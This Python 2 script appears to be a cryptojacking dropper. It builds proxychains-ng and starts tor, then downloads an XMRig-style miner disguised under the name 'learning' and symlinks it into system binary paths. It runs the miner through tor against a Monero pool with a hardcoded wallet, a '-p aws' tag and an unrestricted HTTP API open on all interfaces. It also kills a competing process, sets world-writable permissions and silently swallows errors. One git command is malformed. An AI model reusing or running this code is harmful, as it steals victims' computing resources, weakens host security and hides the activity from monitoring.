__author__ = 'root'
import time
import urllib2
import urllib
import os,sys
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast
useproxy = 0
os.system('chmod 777 ' + __file__)
program = 'learning'
os.system('pkill ' + program)
cores = multiprocessing.cpu_count() - 1
if cores <= 0:
    cores = 1
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
try:
    os.system('apt-get update -y')
    os.system('apt-get install gcc make tor python python-dev -y')
    os.system('rm -rf proxychains-ng')
    os.system('git clonehttps://github.com/yrubertzh/proxychains-ng.git')
    os.chdir('proxychains-ng')
    os.system('make')
    os.system('make install')
    os.system('make install-config')
    if os.path.isfile('/usr/local/bin/' + program) == False:
        os.system('wget https://github.com/yrubertzh/aws_helper/blob/master/xmrig_tls/' + program)
                        
        os.system('chmod 777 ' + program)
        workingdir = os.getcwd()
        os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
        time.sleep (2)
except:
    pass
os.system('tor &')
time.sleep(60)
os.system ('proxychains4 ' + program + ' --donate-level 1 -o pool.hashvault.pro:443 -u 431wRVUSsj89NXLvuoKRyLJdVzZ9qZY6adDcb78JhmZ29G2nAdspMtp9cB5u5HqU5YQgM78MfEWbWDe2vaRjAaxB4YtbUMc -p aws -a rx/0 -k --tls  --http-enabled --http-host 0.0.0.0 --http-port 62432 --http-access-token 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --http-no-restricted ' + str(cores))
